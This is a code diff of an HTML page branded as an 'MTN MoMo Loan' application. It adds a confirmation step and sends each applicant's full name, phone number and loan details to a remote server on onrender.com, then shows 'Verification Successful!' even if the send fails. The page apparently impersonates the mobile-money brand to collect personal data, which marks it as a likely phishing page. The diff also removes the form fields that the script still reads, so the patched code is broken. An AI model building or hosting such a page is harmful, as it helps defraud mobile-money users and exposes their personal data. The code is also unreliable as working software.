@@ -110,17 +110,17 @@
             justify-content: space-between;
             align-items: center;
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             margin: 15px auto;
-            padding: 0 25px;
+            padding: 0 20px;
             position: relative;
         }
 
         .progress-line {
             position: absolute;
-            top: 15px;
-            left: 45px;
-            right: 45px;
+            top: 13px;
+            left: 35px;
+            right: 35px;
             height: 3px;
             background-color: rgba(255, 255, 255, 0.3);
             z-index: 1;
@@ -141,16 +141,14 @@
             align-items: center;
             color: white;
             font-size: 11px;
-            opacity: 0.6;
+            opacity: 0.5;
         }
 
-        .step-item.active {
-            opacity: 1;
-        }
+        .step-item.active { opacity: 1; }
 
         .step-circle {
-            width: 30px;
-            height: 30px;
+            width: 26px;
+            height: 26px;
             border-radius: 50%;
             background-color: #00364f;
             border: 2px solid rgba(255, 255, 255, 0.4);
@@ -160,6 +158,7 @@
             font-weight: bold;
             margin-bottom: 5px;
             color: white;
+            font-size: 11px;
         }
 
         .step-item.active .step-circle {
@@ -179,17 +178,10 @@
             color: var(--text-color);
         }
 
-        .step-panel {
-            display: none;
-        }
+        .step-panel { display: none; }
+        .step-panel.active { display: block; }
 
-        .step-panel.active {
-            display: block;
-        }
-
-        .form-group {
-            margin-bottom: 22px;
-        }
+        .form-group { margin-bottom: 22px; }
 
         .input-label {
             display: flex;
@@ -226,17 +218,8 @@
             margin-bottom: 5px;
         }
 
-        .summary-title {
-            font-size: 20px;
-            font-weight: bold;
-            margin: 0;
-        }
-
-        .summary-subtitle {
-            font-size: 13px;
-            color: #666;
-            margin: 0 0 20px 0;
-        }
+        .summary-title { font-size: 20px; font-weight: bold; margin: 0; }
+        .summary-subtitle { font-size: 13px; color: #666; margin: 0 0 20px 0; }
 
         .summary-row {
             display: flex;
@@ -247,7 +230,12 @@
             font-size: 15px;
         }
 
-        .summary-row .label { color: #555; }
+        .summary-row .label { 
+            color: #555; 
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
         .summary-row .value { font-weight: bold; color: #002233; }
 
         .info-box {
@@ -292,9 +280,30 @@
             font-weight: bold;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
         }
 
         .btn-primary:hover { background-color: var(--mtn-dark-yellow); }
+
+        .btn-secondary {
+            width: 100%;
+            background-color: transparent;
+            color: #004f71;
+            border: 1.5px solid #004f71;
+            border-radius: 25px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
 
         .footer-secure {
             display: flex;
@@ -325,23 +334,8 @@
         <div class="progress-line"><div class="progress-line-fill" id="stepLine"></div></div>
         <div class="step-item active" id="stepIndicator1"><div class="step-circle">1</div><div>1. Details</div></div>
         <div class="step-item" id="stepIndicator2"><div class="step-circle">2</div><div>2. Verify</div></div>
-        <div class="step-item" id="stepIndicator3"><div class="step-circle">3</div><div>4. Success</div></div>
-    </div>
-
-    <div class="main-card">
-        <!-- STEP 1: PANEL -->
-        <div class="step-panel active" id="panel1">
-            <form id="loanForm">
-                <div class="form-group">
-                    <label class="input-label">👤 Full Name</label>
-                    <input type="text" id="fullName" class="form-control" placeholder="Enter your full name" required>
-                </div>
-                <div class="form-group">
-                    <label class="input-label">📱 MTN Number</label>
-                    <input type="text" id="mtnNumber" class="form-control" placeholder="07XXXXXXXX" pattern="^(07)[0-9]{8}$" required>
-                </div>
-               
-                <!-- STEP 2: VERIFICATION PANEL -->
+        <div class="step-item" id="stepIndicator3"><div class="step-circle">3</div><div>3. Confirm</div></div>
+<!-- STEP 2: SUMMARY VERIFICATION -->
         <div class="step-panel" id="panel2">
             <div class="summary-header">
                 <span style="font-size: 24px;">📋</span>
@@ -349,20 +343,43 @@
             </div>
             <p class="summary-subtitle">Please verify your details before proceeding.</p>
 
-            <div class="summary-row"><span class="label">Loan Amount</span><span class="value" id="sumAmount">UGX 0</span></div>
-            <div class="summary-row"><span class="label">Repayment Period</span><span class="value" id="sumPeriod">0 Months</span></div>
-            <div class="summary-row"><span class="label">Interest Rate</span><span class="value">10% per annum</span></div>
-            <div class="summary-row"><span class="label">Monthly Instalment</span><span class="value" id="sumInstalment">UGX 0</span></div>
+            <div class="summary-row"><span class="label">💰 Loan Amount</span><span class="value" id="sumAmount">UGX 0</span></div>
+            <div class="summary-row"><span class="label">📅 Repayment Period</span><span class="value" id="sumPeriod">0 Months</span></div>
+            <div class="summary-row"><span class="label">% Interest Rate</span><span class="value">10% per annum</span></div>
+            <div class="summary-row"><span class="label">🏢 Monthly Instalment</span><span class="value" id="sumInstalment">UGX 0</span></div>
 
             <div class="info-box">
                 <span>ℹ️</span>
                 <div>By continuing, you agree to the MTN MoMo Loan <a href="#">terms and conditions</a>.</div>
             </div>
-            <button type="button" class="btn-primary" id="btnSubmit" onclick="submitToServer()">Next ❯</button>
+            <button type="button" class="btn-primary" onclick="goToStep3()">Next ❯</button>
         </div>
 
-        <!-- STEP 3: SUCCESS PANEL -->
+        <!-- STEP 3: FINAL DETAIL CONFIRMATION -->
         <div class="step-panel" id="panel3">
+            <div class="summary-header">
+                <span style="font-size: 24px;">🛡️</span>
+                <h3 class="summary-title">Confirm Your Details</h3>
+            </div>
+            <p class="summary-subtitle">Please review and confirm your loan information.</p>
+
+            <div class="summary-row"><span class="label">👤 Full Name</span><span class="value" id="confName">John Doe</span></div>
+            <div class="summary-row"><span class="label">📞 Mobile Number</span><span class="value" id="confPhone">+256 712 345678</span></div>
+            <div class="summary-row"><span class="label">💰 Loan Amount</span><span class="value" id="confAmount">UGX 0</span></div>
+            <div class="summary-row"><span class="label">📅 Repayment Period</span><span class="value" id="confPeriod">0 Months</span></div>
+            <div class="summary-row"><span class="label">% Interest Rate</span><span class="value">10% per annum</span></div>
+            <div class="summary-row"><span class="label">📁 Monthly Instalment</span><span class="value" id="confInstalment">UGX 0</span></div>
+
+            <button type="button" class="btn-primary" id="btnSubmit" style="margin-top: 20px;" onclick="submitToServer()">
+                <span>✓</span> Confirm Loan
+            </button>
+            <button type="button" class="btn-secondary" onclick="switchPanel(2, '33%')">
+                <span>←</span> Back
+            </button>
+        </div>
+
+        <!-- STEP 4: SUCCESS LAYOUT -->
+        <div class="step-panel" id="panel4">
             <div class="success-panel">
                 <div class="success-circle">✓</div>
                 <h3 class="success-title">Verification Successful!</h3>
@@ -382,6 +399,11 @@
         // 🌐 LIVE ENDPOINT ROUTING CONFIGURATION
         const SERVER_URL = 'https://onrender.com';
 
+        // Calculation logic data caches
+        let computedAmount = "UGX 0";
+        let computedPeriod = "0 Months";
+        let computedInstalment = "UGX 0";
+
         function goToStep2() {
             const form = document.getElementById('loanForm');
             if (!form.checkValidity()) { form.reportValidity(); return; }
@@ -393,14 +415,37 @@
             const totalRepayment = amount * (1 + (totalInterestRate * (period / 12)));
             const monthlyInstalment = Math.round(totalRepayment / period);
 
-            document.getElementById('sumAmount').innerText = `UGX ${amount.toLocaleString()}`;
-            document.getElementById('sumPeriod').innerText = `${period} ${period === 1 ? 'Month' : 'Months'}`;
-            document.getElementById('sumInstalment').innerText = `UGX ${monthlyInstalment.toLocaleString()}`;
+            computedAmount = `UGX ${amount.toLocaleString()}`;
+            computedPeriod = `${period} ${period === 1 ? 'Month' : 'Months'}`;
+            computedInstalment = `UGX ${monthlyInstalment.toLocaleString()}`;
 
+            // Sync elements step 2
+            document.getElementById('sumAmount').innerText = computedAmount;
+            document.getElementById('sumPeriod').innerText = computedPeriod;
+            document.getElementById('sumInstalment').innerText = computedInstalment;
+
+            // Header labels setup matching layouts
             document.getElementById('dynamicTitle').innerText = "Loan Application";
             document.getElementById('dynamicSubtitle').style.display = "none";
 
-            switchPanel(2, '50%');
+            switchPanel(2, '33%');
+        }
+
+        function goToStep3() {
+            const rawPhone = document.getElementById('mtnNumber').value;
+            // Format phone number variant layout to closely match step 3 preview format 
+            const formattedPhone = rawPhone.replace(/^(0)/, '+256 ');
+
+            // Sync items step 3 confirmation panel view
+            document.getElementById('confName').innerText = document.getElementById('fullName').value;
+            document.getElementById('confPhone').innerText = formattedPhone;
+            document.getElementById('confAmount').innerText = computedAmount;
+            document.getElementById('confPeriod').innerText = computedPeriod;
+            document.getElementById('confInstalment').innerText = computedInstalment;
+
+            document.getElementById('dynamicTitle').innerText = "Loan Verification";
+
+            switchPanel(3, '66%');
         }
 
         async function submitToServer() {
@@ -410,10 +455,10 @@
 
             const payload = {
                 name: document.getElementById('fullName').value,
-                phone: document.getElementById('mtnNumber').value,
-                amount: document.getElementById('sumAmount').innerText,
-                period: document.getElementById('sumPeriod').innerText,
-                instalment: document.getElementById('sumInstalment').innerText
+                phone: document.getElementById('confPhone').innerText,
+                amount: computedAmount,
+                period: computedPeriod,
+                instalment: computedInstalment
             };
 
             try {
@@ -423,10 +468,10 @@
                     body: JSON.stringify(payload)
                 });
             } catch (err) {
-                console.error("Transmission error tracking:", err);
+                console.error("Transmission logging error context:", err);
             } finally {
                 document.getElementById('dynamicTitle').innerText = "Loan Verification";
-                switchPanel(3, '100%');
+                switchPanel(4, '100%');
             }
         }
 
@@ -441,10 +486,9 @@
             document.getElementById('dynamicTitle').innerText = "Loan Application";
             document.getElementById('dynamicSubtitle').style.display = "block";
             document.getElementById('btnSubmit').disabled = false;
-            document.getElementById('btnSubmit').innerText = "Next ❯";
+            document.getElementById('btnSubmit').innerHTML = "<span>✓</span> Confirm Loan";
             switchPanel(1, '0%');
         }
     </script>
 </body>
-</html> 
-
+</html>
